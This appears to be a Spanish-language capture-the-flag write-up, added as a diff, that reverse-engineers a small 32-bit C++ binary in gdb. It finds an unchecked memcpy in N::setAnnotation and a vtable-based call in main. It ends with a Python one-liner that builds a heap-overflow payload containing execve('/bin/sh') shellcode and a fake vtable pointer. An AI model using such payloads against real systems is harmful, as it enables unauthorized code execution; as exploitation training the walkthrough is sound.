@@ -1,0 +1,144 @@
+1.- Estamos ante un binario en c++
+
+2.- Analizamos con gdb y vemos las siguientes funciones que nos pueden interesar
+  - main
+  - 0x080486f6  N::N(int)
+  - 0x0804870e  N::setAnnotation(char*)
+  - 0x0804873a  N::operator+(N&)
+  - 0x0804874e  N::operator-(N&)
+
+3.- Vemos que hay una clase que es N y tiene las siguientes funciónes
+  - 0x080486f6  N::N(int)
+  - 0x0804870e  N::setAnnotation(char*)
+  - 0x0804873a  N::operator+(N&)
+  - 0x0804874e  N::operator-(N&)
+
+4.- Vamos a analizar las funciones de N para ver que datos optenemos
+      (gdb) disassemble 0x080486f6
+    Dump of assembler code for function _ZN1NC2Ei:
+      0x080486f6 <+0>:	push   ebp
+      0x080486f7 <+1>:	mov    ebp,esp
+      0x080486f9 <+3>:	mov    eax,DWORD PTR [ebp+0x8]
+      0x080486fc <+6>:	mov    DWORD PTR [eax],0x8048848
+      0x08048702 <+12>:	mov    eax,DWORD PTR [ebp+0x8]
+      0x08048705 <+15>:	mov    edx,DWORD PTR [ebp+0xc]
+      0x08048708 <+18>:	mov    DWORD PTR [eax+0x68],edx
+      0x0804870b <+21>:	pop    ebp
+      0x0804870c <+22>:	ret
+    End of assembler dump.
+  
+5.- Esto parece el constructor. Carga el valor del parametro en la posición 0x64 de la instancia de la clase
+  [...]
+    0x08048705 <+15>:	mov    edx,DWORD PTR [ebp+0xc]
+    0x08048708 <+18>:	mov    DWORD PTR [eax+0x68],edx
+  [...]
+  Esto nos da pistas de que hay lo que parece un int en la posición 0x68 de la clase N
+
+6.- Desensamblamos setAnnotation
+(gdb) disassemble 0x0804870e
+Dump of assembler code for function _ZN1N13setAnnotationEPc:
+   0x0804870e <+0>:	push   ebp
+   0x0804870f <+1>:	mov    ebp,esp
+   0x08048711 <+3>:	sub    esp,0x18
+   0x08048714 <+6>:	mov    eax,DWORD PTR [ebp+0xc]
+   0x08048717 <+9>:	mov    DWORD PTR [esp],eax
+   0x0804871a <+12>:	call   0x8048520 <strlen@plt>
+   0x0804871f <+17>:	mov    edx,DWORD PTR [ebp+0x8]
+   0x08048722 <+20>:	add    edx,0x4
+   0x08048725 <+23>:	mov    DWORD PTR [esp+0x8],eax
+   0x08048729 <+27>:	mov    eax,DWORD PTR [ebp+0xc]
+   0x0804872c <+30>:	mov    DWORD PTR [esp+0x4],eax
+   0x08048730 <+34>:	mov    DWORD PTR [esp],edx
+   0x08048733 <+37>:	call   0x8048510 <memcpy@plt>
+   0x08048738 <+42>:	leave
+   0x08048739 <+43>:	ret
+End of assembler dump.
+
+7.- Vemos que está función hace llamadas a strlen y memcpy y vemos que usa una variable de la clase N
+  [...]  
+    0x0804871f <+17>:	mov    edx,DWORD PTR [ebp+0x8]
+    0x08048722 <+20>:	add    edx,0x4
+  [...]
+    0x08048730 <+34>:	mov    DWORD PTR [esp],edx
+    0x08048733 <+37>:	call   0x8048510 <memcpy@plt>
+  [...]
+
+8.- Siguiendo la convención de llamadas el primer parametro de la llamada a memcpy() es el puntero destino,
+y vemos que está a 0x4 del inicio de la clase y debe de llegar hasta +0x68 que es donde stá el int miembro de N
+que son en total 0x64(100)bytes. Entonces la clase N tiene los siguientes miembros:
+  int n;
+  char str[100];
+
+9.- Como vemos que no se protege de ninguna manera la cantidad de bytes del segundo parámetro de memcpy podemos usar
+esta función tenemos un posible vector de ataque para nuestro overflow
+
+10.- Cuando Desensamblamos N::operator+(N&) y N::operator-(N&) no vemos nada especial solo que se pasa como
+argumento la referencia de la clase
+
+11.- Vamos a desensambar main()
+
+12.- Lo primero que vemos que el binario requiere dos argumentos o fuerza la salida
+  [...]
+    0x080485fe <+10>:	cmp    DWORD PTR [ebp+0x8],0x1
+    0x08048602 <+14>:	jg     0x8048610 <main+28>
+    0x08048604 <+16>:	mov    DWORD PTR [esp],0x1
+    0x0804860b <+23>:	call   0x80484f0 <_exit@plt>
+  [...]
+
+13.- Continua haciendo dos instancias de la clase N con new() sobre dos punteros. New recibe como parametro el tamaño de la clase.
+A continuación llama al constructor con un valor fijo.
+  [...]
+    0x08048610 <+28>:	mov    DWORD PTR [esp],0x6c     ;tamaño de la instancia de la clase (108 bytes) 
+    0x08048617 <+35>:	call   0x8048530 <_Znwj@plt>    ;llamada a new()
+    0x0804861c <+40>:	mov    ebx,eax                  
+    0x0804861e <+42>:	mov    DWORD PTR [esp+0x4],0x5  ;valor 5 como parametro del constructor
+    0x08048626 <+50>:	mov    DWORD PTR [esp],ebx      ;carga del puntero de clase en esp
+    0x08048629 <+53>:	call   0x80486f6 <_ZN1NC2Ei>    ;llamada al constructor
+  [...]
+    0x08048632 <+62>:	mov    DWORD PTR [esp],0x6c
+    0x08048639 <+69>:	call   0x8048530 <_Znwj@plt>
+    0x0804863e <+74>:	mov    ebx,eax
+    0x08048640 <+76>:	mov    DWORD PTR [esp+0x4],0x6
+    0x08048648 <+84>:	mov    DWORD PTR [esp],ebx
+    0x0804864b <+87>:	call   0x80486f6 <_ZN1NC2Ei>
+  [...]
+
+14.- El main() sigue preparando  y llamando a método setAnnotation(char *) del primer objeto creado con new()
+y como argumento le pasa argv[1]
+  [...]
+    0x08048650 <+92>:	mov    DWORD PTR [esp+0x18],ebx
+    0x08048654 <+96>:	mov    eax,DWORD PTR [esp+0x1c]
+    0x08048658 <+100>:	mov    DWORD PTR [esp+0x14],eax
+    0x0804865c <+104>:	mov    eax,DWORD PTR [esp+0x18]
+    0x08048660 <+108>:	mov    DWORD PTR [esp+0x10],eax
+    0x08048664 <+112>:	mov    eax,DWORD PTR [ebp+0xc]
+    0x08048667 <+115>:	add    eax,0x4                              ;argv[1]
+    0x0804866a <+118>:	mov    eax,DWORD PTR [eax]
+    0x0804866c <+120>:	mov    DWORD PTR [esp+0x4],eax              ;puntero this del obj_1
+    0x08048670 <+124>:	mov    eax,DWORD PTR [esp+0x14]
+    0x08048674 <+128>:	mov    DWORD PTR [esp],eax
+    0x08048677 <+131>:	call   0x804870e <_ZN1N13setAnnotationEPc>  ;llamada a setAnnotation(argb[1])
+  [...]
+
+15.- El main continua con el main para preparar un call de la sobrecarga del operador+ de obj_2
+  [...]
+    0x0804867c <+136>:	mov    eax,DWORD PTR [esp+0x10] ;this de obj_2
+    0x08048680 <+140>:	mov    eax,DWORD PTR [eax]      ;desreferencia de this->obj_2
+    0x08048682 <+142>:	mov    edx,DWORD PTR [eax]      ;puntero al primera sobrecarga de obj_2 en este caso operator+ *(vtable)
+    0x08048684 <+144>:	mov    eax,DWORD PTR [esp+0x14] ;this de obj_1
+    0x08048688 <+148>:	mov    DWORD PTR [esp+0x4],eax  ;this de obj_1 a esp+0x4
+    0x0804868c <+152>:	mov    eax,DWORD PTR [esp+0x10]
+    0x08048690 <+156>:	mov    DWORD PTR [esp],eax      ;this de obj_2 a esp
+    0x08048693 <+159>:	call   edx                      ;llamada a obj_2.operator+(obj_1)
+  [...]
+    * - (vtable):
+      La vtable es una estructura de datos que contiene punteros a las funciones virtuales o sobrecargas 
+      de operadores de una clase. Cuando una clase tiene métodos virtuales o sobrecargas, el compilador 
+      genera una vtable para esa clase. Cada objeto de la clase tiene un puntero a su vtable (llamado vptr), 
+      que se usa en tiempo de ejecución para invocar los métodos correctos, implementando así el polimorfismo.
+
+      Normalmente, el puntero a la vtable, se encuentra en al principio de la instancia del objeto.
+
+
+
+python -c "print '\x0c\xa0\x04\x08' + '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80' + 'A' * 83 + '\x0c\xa0\x04\x08'" > /tmp/payload
